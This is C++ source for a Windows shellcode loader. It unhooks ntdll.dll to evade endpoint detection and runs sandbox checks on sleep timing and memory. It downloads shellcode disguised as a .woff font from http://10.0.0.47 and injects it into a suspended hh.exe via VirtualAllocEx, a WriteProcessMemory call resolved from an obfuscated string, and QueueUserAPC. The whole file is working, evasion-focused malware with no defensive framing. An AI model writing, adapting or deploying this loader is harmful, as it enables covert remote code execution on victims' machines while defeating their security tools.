#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <string.h>
#include <vector>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <bcrypt.h>
#include <iostream>
#include <map>
#include <string>
#include <fstream>

#pragma comment (lib, "Wininet.lib")

typedef BOOL(WINAPI* WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

typedef BOOL(WINAPI* QueueUserAPCFunc)(PAPCFUNC, HANDLE, ULONG_PTR);

BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
    HINTERNET hInternet = InternetOpenW(L"A Custom User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return FALSE;
    }

    HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hInternetFile) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    DWORD bytesRead;
    BYTE buffer[4096];
    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        payload.insert(payload.end(), buffer, buffer + bytesRead);
    }

    if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS) {
        InternetCloseHandle(hInternetFile);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    InternetCloseHandle(hInternetFile);
    InternetCloseHandle(hInternet);
    return TRUE;
}

BOOL CheckVirtualAllocExNuma(){
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        return FALSE;
    }

    FARPROC pVirtualAllocExNuma = GetProcAddress(hKernel32, "VirtualAllocExNuma");
    if (pVirtualAllocExNuma == NULL) {
        return FALSE;
    }

    return TRUE;
}

void unhookNtll(){
    HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);


	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);
}

void evade() {
    unhookNtll();
    FILETIME startTime;
    GetSystemTimeAsFileTime(&startTime);
    Sleep(2000);
    FILETIME endTime;
    GetSystemTimeAsFileTime(&endTime);
    ULARGE_INTEGER start, end;
    start.LowPart = startTime.dwLowDateTime;
    start.HighPart = startTime.dwHighDateTime;
    end.LowPart = endTime.dwLowDateTime;
    end.HighPart = endTime.dwHighDateTime;
    ULONGLONG elapsedTime = end.QuadPart - start.QuadPart;
    elapsedTime /= 10000000;

    if (elapsedTime < 1.5) {
        exit(0);
    }

	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);

	GlobalMemoryStatusEx(&statex);

	ULONGLONG totalPhysicalMemoryInGB = statex.ullTotalPhys / (1024 * 1024 * 1024);

	if (totalPhysicalMemoryInGB <= 1) {
		exit(1);
	}

    CheckVirtualAllocExNuma();  
};

int main() {
    evade();
	std::vector<BYTE> payload;
	LPCWSTR url = L"http://10.0.0.47/shellcode.woff";

	if (!GetPayloadFromUrl(url, payload)) {
		printf("[!] Something Failed \n");
	}

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    PVOID pBaseAddress = nullptr;
    SIZE_T* bytesWritten = 0;

    char aProcmemory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
    WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aProcmemory);
    pwProcmem(victimProcess, shellAddress, payload.data(), payload.size(), bytesWritten);

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

    QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "QueueUserAPC");
    pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    //QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

    ResumeThread(threadHandle);
}